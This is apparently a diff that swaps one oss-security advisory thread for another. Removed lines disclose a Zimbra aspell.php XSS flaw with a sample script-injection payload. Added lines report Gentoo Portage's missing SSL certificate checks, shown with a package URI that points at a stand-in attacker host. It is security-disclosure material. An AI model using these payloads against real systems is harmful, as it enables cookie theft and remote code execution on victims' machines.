@@ -1,98 +1,67 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/06/1
-Message-ID: <515F66B9.9050001@redhat.com>
-Date: Fri, 05 Apr 2013 18:05:13 -0600
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/16/3
+Message-ID: <51943A43.8070008@redhat.com>
+Date: Wed, 15 May 2013 19:45:39 -0600
 From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: Michael Scherer <misc@...b.org>
-Subject: Re: Zimbra XSS in aspell.php, CVE request
+CC: "Jason A. Donenfeld" <Jason@...c4.com>, Gentoo Security <security@...too.org>, zx2c4@...too.org
+Subject: Re: CVE Request: Man in the middle on Gentoo Portage binary package installer
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-On 04/05/2013 04:21 AM, Michael Scherer wrote:
-> Hi,
+On 05/15/2013 04:46 AM, Jason A. Donenfeld wrote:
+> Hi Kurt,
 > 
-> While trying to see how hard a bug would be to fix in Zimbra
-> during a discussion with a coworker, I stumbled across a XSS flaw
-> in Zimbra, in a spell checking external webservice.
+> Portage is the package manager of Gentoo Linux. It supports many 
+> features, one of which is the ability to synchronize against a
+> remote list of binary packages, and use that list to determine
+> where to fetch such binary packages. One of the fields in this list
+> of packages is URI:
 > 
-> Since I didn't found the public web interface for the source code
-> of Zimbra and since perforce is not as straightforward to run on
-> linux than git and slow to download the 2G of source code, I
-> recommend to people to look at the github mirror, even if this mean
-> losing some information and changelog.
+> victim # curl -s -k https://portage-build.zx2c4.com/Packages | grep
+> URI: URI: ftp://horrible.attacker.somewhere.on.the.internet/blah
 > 
-> The issue is on this file : 
-> https://github.com/Zimbra-Community/zimbra-sources/blob/master/main/ZimbraServer/src/php/aspell.php
+> victim # emerge -1 portage-utils Calculating dependencies... done!
 > 
-> 
-> The problem is that $dictionary is coming from user input ( from
-> GET parameters ), since it is a copy of $_REQUEST. Then if no text
-> is given ( and so $text is empty ), it is printed back in the html
-> form displayed without any kind of sanitization at all ( line133 : 
-> https://github.com/Zimbra-Community/zimbra-sources/blob/master/main/ZimbraServer/src/php/aspell.php#L133
-> )
-> 
-> So a attacker could inject javascript/html there just by giving
-> crafted link to a user, running as the domain of zimbra ( albeit on
-> a different port ). Something like 
-> http://example.org/aspell.php?disctionnary=><script> 
-> alert('foo');</script>
-> 
-> ( with proper url encoding of course ).
-> 
-> Due to typecasting, "" is considered as equal to NULL for '==',
-> while it may not be the case in other circumstances.
-> 
-> If I am not wrong, the default location for the spell checking
-> service is http://$config{HOSTNAME}:7780/aspell.php, so a
-> improperly secured server ( ie, without a firewall ) could be
-> vulnerable to javascript injection, which could be used to steal
-> various informations ( like the session cookie ).
-> 
-> However, depending on the browser and the security setting, the
-> issue could be mitigated, even if it seems we can still steal the
-> cookie with a spear phising attempt (
-> http://seckb.yehg.net/2012/06/xss-gaining-access-to-httponly-cookie.html
-> )
-> 
-> The issue can be tested quite easily, just take any php hosting, 
-> download the aspell.php file there and run :
-> 
-> $ curl 
-> 'http://www.example.org/aspell.php?dictionary=insert_html_here_with<blink>'
+>>>> Emerging binary (1 of 1) app-portage/portage-utils-0.30 from
+>>>> gentoo
+> --2013-05-15 12:33:32-- 
+> ftp://horrible.attacker.somewhere.on.the.internet/blah/app-portage/portage-utils-0.30.tbz2
 >
->  You should see that the html code is inserted back in the form. I
-> didn't spent time on writing a trivial exploit for that.
 > 
-> Upstream have been notified on 2013-01-12 on a private bug (
-> https://bugzilla.zimbra.com/show_bug.cgi?id=79640 ), with first
-> answer on 2013-02-22, along with a fix following on the next hours.
-> However, the fix is incorrect, and my attempt to make the coder
-> change his mind failed.
+=> ‘/usr/portage/packages/app-portage/portage-utils-0.30.tbz2’
+> Resolving horrible.attacker.somewhere.on.the.internet...
 > 
-> The fix that was written can be found on a aggregate commit on 
-> https://github.com/Zimbra-Community/zimbra-sources/commit/e7682c00be82a0c3ab51ee92f518bdcc1e07536c#L3L148
+> Over insecure connections, Portage provides the ability to use
+> HTTPS (in addition to SFTP and SSH), so that this remote list of
+> binary packages is not tampered with. This list of binary packages
+> will be downloaded in the background silently. Unfortunately,
+> Portage does not validate the SSL certificates, leaving this open
+> to a trivial man in the middle attack. An attacker could leverage
+> this man in the middle vector to remotely gain complete control
+> over a victim's machine, since Portage runs with essentially full
+> permissions.
+> 
+> I reported this to the maintainer of Portage in Gentoo Bug #469888 
+> [1], and it was fixed in commit b5969af9f5 [2].
+> 
+> Do note that while this commit solves the immediate problem with 
+> fetching /Packages, as detailed above, there may be other
+> additional unconfirmed insecure uses of the vulnerable urlopen()
+> function that have not yet been analyzed or fixed.
+> 
+> Thanks, Jason
+> 
+> 
+> [1] https://bugs.gentoo.org/show_bug.cgi?id=469888 [2]
+> http://git.overlays.gentoo.org/gitweb/?p=proj/portage.git;a=commit;h=b5969af9f575e4e4b669f44e76ad01f0dbc2dd27
 >
->  While that could fix a XSS issue if the code was correctly used,
-> there was no security issue since the call of the function is wrong
-> on line 67, we see 1 parameter is missing and the value of
-> $dictionnary is overwrote by the return code and is always 0, so we
-> cannot inject anything with it.
 > 
-> As I couldn't convince upstream to correct this, and given that I
-> have let enough time to react to them after following the
-> procedure, I consider that full disclosure is the next step to have
-> it corrected.
-> 
-> Can someone assign a CVE for it ?
-> 
+Yeah SSL with no certificate checks is not so good.
 
-Is this also in the open source version?
-
-http://wiki.zimbra.com/wiki/Building_Zimbra_using_Perforce
+Please use CVE-2013-2100 for this issue.
 
 
 - -- 
@@ -101,17 +70,17 @@ PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.4.13 (GNU/Linux)
 
-iQIcBAEBAgAGBQJRX2a5AAoJEBYNRVNeJnmTq9AP/0RNlD+BHdaPoe2vU6sTMLWo
-9EYu5PWg0OQQ6n75fCI+YASIQOWvaYT0zfQHoRT+HiyPM0/uS99DHIMYZAWtWfgP
-008skYVOLD7gU0oh1/InxyKbUdCqTyg0cCeGgbDTXHHXPUw5pf01gQF141Xk6Ip7
-2kDkDNuYpROG/ROOEZMGX79JRrymEKzhGM6MIXwldMrHdgReJyNTrebmlbo7F2fX
-He0TNNntikFhhRecnjEYBFG43FrKkYK7KuaQAMgK4IgfLKBACHUPNeaE+O+gUgvE
-0ei7PHVpcRqj5Ttl2a5808C8OtyG8fPSNj6dvF8A61S56GGa5kZoxku/BIl+wnUV
-uuU4e2U+onGsXUkJ6ZBM4bxgwYtTDhpzWBu4X8RyXhykZ/693dVuVkH/f5lD8cXi
-3dd7aEvmsbatxupZHgaN4raeRCnaxToZ6D9jmqldUddOziDWn9KZbIdLBAyGOkXh
-lHByQfmWJym8OxqgXQFwTeyyc0T0zXqlNSZv+BKUIuR6ba+dqPLj7z0/4n4L023Q
-B+Ethv5aUMvuVSDr44cJyRzUNRNsbF1yGKRJCQcWW8qcVWwr8BbpYinYlxTWQWvE
-/FJSYYCPo9o7ifHx/EG9xSslyPCGqeZ69UHPQQcEITIHMz3d6BJaazZIxsoJHaHe
-7bDA9DWIk/j/56qkvC06
-=8/EA
+iQIcBAEBAgAGBQJRlDpCAAoJEBYNRVNeJnmTZIMQANMmQfww+/2TTShIa3AcO9sS
+S6KnC2w40Q8eRza+8rMMWQ0w91e+vhQuQ09Zyl02xWctSE6WvlM/jtZTHKwjY4lh
+q2pxkSdMecTbNANtfkaIlU5rsWiROuGbvb33ITwjJNvONVGPh9+kx/xccRqodHc2
+hlb9jhdKlZSVEUgIeCCBDTWGZnwbQF3CK9tFMWJGj6lTdOaqCiM04whfHmX9urje
+6Fj0vLW1VbbGmFQZbIJajGzwNZQvwlNN9/5kn5nWE6WzfqXwxmj1NpuVlnFSpU83
+0jeWEdbA0b7mKkDiBryuo5eRtJmdAHxpe+Mvqin/d+pXRLX7qbvpY2IlXTQR2U/u
+jtmO943UR+nRHdItAX0VPG6ua4AEecnqgUTYymMrt4344u8I3RoLwjxDGmmZyThV
+0i84orR8rbdawQOUWUIjkrK9n/fPHDJ3QBdegZ5Na3nyGGdXSiApFzaxcfKmpVDe
+4SzcNVghPQNj5mEappBTIPO5KdPF6FIQxWcj9/a6M9bVwJEyd4gZVTgQmGLAwHgQ
+jKdmWzh/hBwm+RTfgJMZI0nJmydUCFlGgd5PAFkMY7VY1lvbbaEEYQPdDE1mtHL1
+60cB38PYBL5Thf25FqV+7cpjZTglOyDJsylPgHG3B6M5SDJXmKxgvnaJAW3+zpmQ
+y/dM0r9LeQu5MhPhsdeC
+=JhKw
 -----END PGP SIGNATURE-----
